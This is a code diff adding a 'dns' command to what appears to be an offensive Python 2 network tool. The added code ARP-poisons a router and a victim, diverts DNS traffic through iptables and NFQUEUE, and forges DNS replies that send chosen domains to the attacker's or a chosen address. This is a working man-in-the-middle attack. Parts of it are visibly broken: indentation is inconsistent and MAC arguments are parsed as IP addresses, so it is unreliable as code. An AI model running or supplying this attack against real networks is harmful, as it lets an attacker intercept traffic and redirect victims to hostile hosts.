@@ -50,12 +50,39 @@ from subprocess import call
 from netaddr import *
 import getpass
 
+from twisted.internet import reactor
+from twisted.internet.interfaces import IReadDescriptor
+import os
+import nfqueue
+import signal
+
 
 clientsList = [ ]
 global myip
 
 yes = set(['yes','y', 'ye', 'Y','YE','YES','yea', 'yeah', 'oui', ''])
 no = set(['no','n', 'No', 'NO', 'non', 'nah'])
+
+
+
+class Queued(object):
+    def __init__(self):
+        self.q = nfqueue.queue()
+        self.q.set_callback(cb)
+        self.q.fast_open(0, socket.AF_INET)
+        self.q.set_queue_maxlen(5000)
+        reactor.addReader(self)
+        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
+        print '[*] Waiting for data'
+    def fileno(self):
+        return self.q.get_fd()
+    def doRead(self):
+        self.q.process_pending(100)
+    def connectionLost(self, reason):
+        reactor.removeReader(self)
+    def logPrefix(self):
+        return 'queue'
+
 
 #choice = raw_input().lower()
 def yesorno(choice):
@@ -65,6 +92,30 @@ def yesorno(choice):
 	return False
     else:
 	sys.stdout.write("Please respond with 'yes' or 'no'")
+
+
+def cb(payload):
+    data = payload.get_data()
+    pkt = IP(data)
+    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
+    if not pkt.haslayer(DNSQR):
+        payload.set_verdict(nfqueue.NF_ACCEPT)
+    else:
+        if arg_parser().spoofall:
+            if not arg_parser().redirectto:
+                spoofed_pkt(payload, pkt, localIP)
+            else:
+                spoofed_pkt(payload, pkt, arg_parser().redirectto)
+        if arg_parser().domain:
+            if arg_parser().domain in pkt[DNS].qd.qname:
+                if not arg_parser().redirectto:
+                    spoofed_pkt(payload, pkt, localIP)
+                else:
+                    spoofed_pkt(payload, pkt, arg_parser().redirectto)
+
+
+
+
 	
 
 def arp_monitor_callback(pkt):
@@ -276,8 +327,73 @@ class CLI(cmd.Cmd):
 	       
 	
     def do_dns(self, arg):
-	"""DNS Poisioning."""	
+	"""
+	dns [routerIP] [victimIP] [routerMAC] [victimMAC]
+    #########################################
+    # 
+    # DNS Poisioning
+    # author: Dan McInerary
+    #http://danmcinerney.org/reliable-dns-spoofing-with-python-twisting-in-arp-poisoning-pt-2/
+    #########################################
+	    """	
 	
+	arplist = arg.split(" ")
+    
+	if len(arplist) < 4:
+	    print "\n Error, not enough args \n"
+	else:
+	    print"Enabling IP forwarding...\n"
+
+	    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')   
+ 
+   ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipf_read = ipf.read()
+    if ipf_read != '1\n':
+        ipf.write('1\n')
+    ipf.close()
+
+
+	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+		ipf.write('1\n')#enable IP forwarding with '1'     
+	    #signal.signal(signal.SIGINT, signal_handler)
+	    
+	    routerIP = str(IPAddress(arplist[0]))
+	    victimIP = str(IPAddress(arplist[1]))	    
+	    routerMAC = str(IPAddress(arplist[2]))
+	    victimMAC = str(IPAddress(arplist[3]))
+
+	       
+	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       
+
+	    Queued()
+	    rctr = threading.Thread(target=reactor.run, args=(False,))
+	    rctr.daemon = True
+	    rctr.start()
+
+	    def signal_handler(signal, frame):
+		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+		with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward: 
+		    forward.write(ipf_read)
+		restore(routerIP, victimIP, routerMAC, victimMAC)
+		restore(routerIP, victimIP, routerMAC, victimMAC)
+		os.system('/sbin/iptables -F')
+	        os.system('/sbin/iptables -X')
+		os.system('/sbin/iptables -t nat -F')
+	        os.system('/sbin/iptables -t nat -X')
+		sys.exit(0)
+	     signal.signal(signal.SIGINT, signal_handler)
+
+
+	    while 1:
+		try:
+		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
+		    time.sleep(1.5)
+		except KeyboardInterrupt:
+		    print "\n"
+		    break
+	       
+
+
 	
     def do_syn(self, arg):
 	"""syn [target ip] [port]
